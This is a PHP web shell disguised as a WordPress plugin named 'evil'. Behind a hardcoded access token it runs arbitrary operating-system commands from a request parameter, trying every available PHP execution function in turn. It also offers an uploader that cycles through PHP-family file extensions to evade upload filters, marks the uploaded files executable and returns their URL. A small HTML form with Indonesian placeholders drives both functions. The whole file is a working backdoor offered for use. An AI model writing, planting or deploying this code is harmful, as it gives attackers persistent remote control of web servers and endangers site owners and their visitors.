<?php
/* Plugin Name: evil */
$__T = '9f3c1e7a5b2d8046';
if (!isset($_REQUEST['t']) || !hash_equals($__T, (string)$_REQUEST['t'])) { return; }
/* ---------- command execution ---------- */
if (isset($_REQUEST['cmd'])) {
    header('Content-Type: text/plain; charset=utf-8');
    $c = (string)$_REQUEST['cmd'];
    echo '# ' . $c . "\n";
    $rc = 127;
    if (function_exists('passthru')) { passthru($c, $rc); }
    elseif (function_exists('system')) { echo system($c, $rc); }
    elseif (function_exists('shell_exec')) { echo shell_exec($c); $rc = 0; }
    elseif (function_exists('exec')) { exec($c, $o, $rc); echo implode("\n", $o); }
    elseif (function_exists('proc_open')) {
        $__p = proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $__ps);
        if (is_resource($__p)) {
            echo stream_get_contents($__ps[1]);
            echo stream_get_contents($__ps[2]);
            $rc = proc_close($__p);
        } else { echo "PROC_OPEN_FAIL\n"; }
    }
    elseif (function_exists('popen')) {
        $__h = popen($c, 'r');
        if ($__h) { while (!feof($__h)) { echo fread($__h, 8192); } $rc = pclose($__h); }
        else { echo "POPEN_FAIL\n"; }
    }
    elseif (function_exists('pcntl_exec')) {
        pcntl_exec('/bin/sh', array('sh', '-c', $c));
        echo "PCNTL_FAIL\n";
    }
    else { echo "NO_EXEC_FN\n"; }
    echo "\n[rc=" . $rc . "]\n";
    exit;
}
/* ---------- uploader (extension bypass) ---------- */
if (isset($_FILES['f'])) {
    header('Content-Type: text/plain; charset=utf-8');
    $doc = isset($_SERVER['DOCUMENT_ROOT']) ? rtrim(str_replace('\\','/',(string)$_SERVER['DOCUMENT_ROOT']), '/') : '';
    $base = (isset($_REQUEST['path']) && $_REQUEST['path'] !== '') ? (string)$_REQUEST['path'] : __DIR__;
    if ($base[0] !== '/' && $doc !== '') { $base = $doc . '/' . $base; }
    if (!is_dir($base) && !@mkdir($base, 0755, true)) { echo "FAIL nodir:" . $base . "\n"; exit; }
    $tmp = isset($_FILES['f']['tmp_name']) ? $_FILES['f']['tmp_name'] : '';
    if (!is_uploaded_file($tmp) && !is_file($tmp)) { echo "FAIL nofile\n"; exit; }
    $orig = basename((string)$_FILES['f']['name']);
    $want = (isset($_REQUEST['name']) && $_REQUEST['name'] !== '') ? basename((string)$_REQUEST['name']) : '';
    $stem = ($want !== '') ? pathinfo($want, PATHINFO_FILENAME) : pathinfo($orig, PATHINFO_FILENAME);
    if ($stem === '') { $stem = 'f'; }
    $wanted_ext = ($want !== '') ? strtolower(pathinfo($want, PATHINFO_EXTENSION)) : '';
    $exts = array('php','phar','phtml','php7','pht','php5','php3','php4','php8','inc','phps','shtml','html');
    $order = array();
    if ($wanted_ext !== '') { $order[] = $wanted_ext; }
    foreach ($exts as $e) { if (!in_array($e, $order)) { $order[] = $e; } }
    foreach ($order as $e) {
        $fn = $base . '/' . $stem . '.' . $e;
        if (@move_uploaded_file($tmp, $fn) || @copy($tmp, $fn)) {
            @chmod($fn, 0755);
            $abs = realpath($fn);
            $url = '';
            if ($doc !== '' && $abs && strpos(str_replace('\\','/',$abs), $doc) === 0) {
                $rel = ltrim(substr(str_replace('\\','/',$abs), strlen($doc)), '/');
                $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
                $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'x';
                $url = $scheme . '://' . $host . '/' . $rel;
            }
            echo "OK " . $abs . ($url !== '' ? '|' . $url : '') . "\n";
            exit;
        }
    }
    echo "FAIL all_exts:" . implode(',', $order) . "\n";
    exit;
}
/* ---------- HTML UI ---------- */
header('Content-Type: text/html; charset=utf-8');
echo '<!DOCTYPE html><html><head><title>wdp-up</title></head><body>'
   . '<h3>Uploader (auto bypass: php, phar, phtml, php7, pht, php5, php3, php4, php8, inc, phps, shtml, html)</h3>'
   . '<form method="post" enctype="multipart/form-data">'
   . '<input type="file" name="f" required>'
   . ' <input name="name" placeholder="nama file (opsional)">'
   . ' <input name="path" placeholder="path tujuan (default: folder ini)">'
   . ' <button>Upload</button></form>'
   . '<h3>Command</h3>'
   . '<form method="get"><input name="cmd" size="50" placeholder="id; uname -a"><button>Run</button></form>'
   . '<p>cmd: <code>shell?t=TOKEN&amp;cmd=id</code></p>'
   . '</body></html>';
